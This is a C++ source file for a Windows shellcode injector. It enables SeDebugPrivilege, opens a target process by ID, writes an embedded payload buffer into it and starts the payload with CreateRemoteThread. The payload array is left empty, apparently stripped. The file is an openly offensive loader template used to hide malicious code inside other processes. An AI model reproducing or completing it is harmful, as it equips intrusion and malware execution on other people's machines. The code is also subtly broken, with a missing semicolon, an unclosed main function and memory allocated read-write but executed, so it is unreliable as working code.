#include <windows.h>
#include <userenv.h>
#include <iostream>
#include <tchar.h>
#include "stdlib.h"
#pragma comment(lib,"ws2_32.lib")
#pragma comment (lib,"Advapi32.lib")
#pragma comment (lib,"Iphlpapi.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "userenv.lib")

using namespace std;

/* length: 795 bytes */
unsigned char buf[] = {} 
int main(int argc, char* argv[]) {
	DWORD ProcessID = atoi(argv[1]);
	HANDLE CurrentToken;
	LUID SeDebugNameValue;
	TOKEN_PRIVILEGES TokenProvoleges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &CurrentToken)) {
		cout << "We Need Administrator Priveileges!" << endl;
		return 0;
	}

	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &SeDebugNameValue)) {
		CloseHandle(CurrentToken);
		cout << "We Need Administrator Priveileges!" << endl;
		return 0;
	}

	TokenProvoleges.PrivilegeCount = 1;
	TokenProvoleges.Privileges[0].Luid = SeDebugNameValue;
	TokenProvoleges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(CurrentToken, FALSE, &TokenProvoleges, sizeof TokenProvoleges, NULL, NULL)) {
		CloseHandle(CurrentToken);
		cout << "We Need Administrator Priveileges!" << endl;
		return 0;
	}

	CloseHandle(CurrentToken);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessID);
	if (hProcess == 0) {
		cout << "[-] Open Process Failed! Got System Error Code: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return 0;
	}
	DWORD Size = sizeof(buf);
	LPVOID RemoteBuffer = VirtualAllocEx(hProcess, NULL, Size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (RemoteBuffer == NULL) {
		cout << "[-] Memory Alloc Failed! Got System Error Code: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return 0;
	}
	;
	if (!WriteProcessMemory(hProcess, RemoteBuffer, buf, Size, NULL)) {
		cout << "[-] Write Process Memory Failed! Got System Error Code: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return 0;
	}
	HANDLE RemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteBuffer, NULL, 0, NULL);
	if (RemoteThread == NULL) {
		cout << "[-] Create Remote Thread Failed! Got System Error Code: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return 0;
	}
	cout << "[+] Process Injection Succeed!" << endl;
	CloseHandle(hProcess);
	return 0;
